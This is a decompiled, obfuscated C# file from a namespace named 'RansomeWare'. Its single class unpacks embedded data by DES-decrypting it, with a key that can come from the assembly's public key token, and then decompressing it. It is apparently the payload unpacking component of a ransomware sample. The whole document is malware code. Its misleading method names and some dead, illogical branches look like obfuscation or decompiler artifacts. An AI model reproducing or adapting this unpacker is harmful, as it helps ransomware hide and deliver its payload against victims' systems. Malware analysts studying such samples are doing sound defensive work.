using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;

namespace RansomeWare;

internal class AspectConverter
{
	private static readonly object cancelDisposed;

	private static readonly int previousUri;

	private static readonly int firstSyncObject;

	private static readonly MemoryStream captionPosition;

	private static readonly MemoryStream addressID;

	private static readonly byte logEnabled;

	static AspectConverter()
	{
		captionPosition = null;
		addressID = null;
		previousUri = int.MaxValue;
		firstSyncObject = int.MinValue;
		captionPosition = new MemoryStream(0);
		addressID = new MemoryStream(0);
		cancelDisposed = new object();
	}

	private static string ClonePath(Assembly cancelDisposed)
	{
		string text = cancelDisposed.FullName;
		int num = text.IndexOf(',');
		if (num >= 0)
		{
			text = text.Substring(0, num);
		}
		return text;
	}

	private static byte[] FreeAction(Assembly cancelDisposed)
	{
		try
		{
			string fullName = cancelDisposed.FullName;
			int num = fullName.IndexOf("PublicKeyToken=");
			if (num < 0)
			{
				num = fullName.IndexOf("publickeytoken=");
			}
			if (num < 0)
			{
				return null;
			}
			num += 15;
			if (fullName[num] != 'n' && fullName[num] != 'N')
			{
				string s = fullName.Substring(num, 16);
				long value = long.Parse(s, NumberStyles.HexNumber);
				byte[] bytes = BitConverter.GetBytes(value);
				Array.Reverse((Array)bytes);
				return bytes;
			}
			return null;
		}
		catch
		{
		}
		return null;
	}

	internal static byte[] SearchDeployment(Stream cancelDisposed)
	{
		lock (AspectConverter.cancelDisposed)
		{
			return ViewReference(97L, cancelDisposed);
		}
	}

	internal static byte[] SelectWindow(long cancelDisposed, Stream previousUri)
	{
		try
		{
			return SearchDeployment(previousUri);
		}
		catch (HostProtectionException)
		{
			return ViewReference(97L, previousUri);
		}
	}

	internal static byte[] ViewReference(long cancelDisposed, Stream previousUri)
	{
		Stream stream = previousUri;
		MemoryStream memoryStream = null;
		for (int i = 1; i < 4; i++)
		{
			previousUri.ReadByte();
		}
		ushort num = (ushort)previousUri.ReadByte();
		num = (ushort)(~num);
		if ((num & 2u) != 0)
		{
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			byte[] array = new byte[8];
			previousUri.Read(array, 0, 8);
			dESCryptoServiceProvider.IV = array;
			byte[] array2 = new byte[8];
			previousUri.Read(array2, 0, 8);
			bool flag = true;
			byte[] array3 = array2;
			for (int j = 0; j < array3.Length; j++)
			{
				if (array3[j] != 0)
				{
					flag = false;
					break;
				}
			}
			if (flag)
			{
				array2 = FreeAction(Assembly.GetExecutingAssembly());
			}
			dESCryptoServiceProvider.Key = array2;
			if (captionPosition == null)
			{
				if (AspectConverter.previousUri == int.MaxValue)
				{
					captionPosition.Capacity = (int)previousUri.Length;
				}
				else
				{
					captionPosition.Capacity = AspectConverter.previousUri;
				}
			}
			captionPosition.Position = 0L;
			ICryptoTransform cryptoTransform = dESCryptoServiceProvider.CreateDecryptor();
			int inputBlockSize = cryptoTransform.InputBlockSize;
			_ = cryptoTransform.OutputBlockSize;
			byte[] array4 = new byte[cryptoTransform.OutputBlockSize];
			byte[] array5 = new byte[cryptoTransform.InputBlockSize];
			int k;
			for (k = (int)previousUri.Position; k + inputBlockSize < previousUri.Length; k += inputBlockSize)
			{
				previousUri.Read(array5, 0, inputBlockSize);
				int count = cryptoTransform.TransformBlock(array5, 0, inputBlockSize, array4, 0);
				captionPosition.Write(array4, 0, count);
			}
			previousUri.Read(array5, 0, (int)(previousUri.Length - k));
			byte[] array6 = cryptoTransform.TransformFinalBlock(array5, 0, (int)(previousUri.Length - k));
			captionPosition.Write(array6, 0, array6.Length);
			stream = captionPosition;
			stream.Position = 0L;
			memoryStream = captionPosition;
		}
		if ((num & 8u) != 0)
		{
			if (addressID == null)
			{
				if (firstSyncObject == int.MinValue)
				{
					addressID.Capacity = (int)stream.Length * 2;
				}
				else
				{
					addressID.Capacity = firstSyncObject;
				}
			}
			addressID.Position = 0L;
			DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
			int num2 = 1000;
			byte[] buffer = new byte[1000];
			int num3;
			do
			{
				num3 = deflateStream.Read(buffer, 0, num2);
				if (num3 > 0)
				{
					addressID.Write(buffer, 0, num3);
				}
			}
			while (num3 >= num2);
			memoryStream = addressID;
		}
		if (memoryStream != null)
		{
			return memoryStream.ToArray();
		}
		byte[] array7 = new byte[previousUri.Length - previousUri.Position];
		previousUri.Read(array7, 0, array7.Length);
		return array7;
	}
}
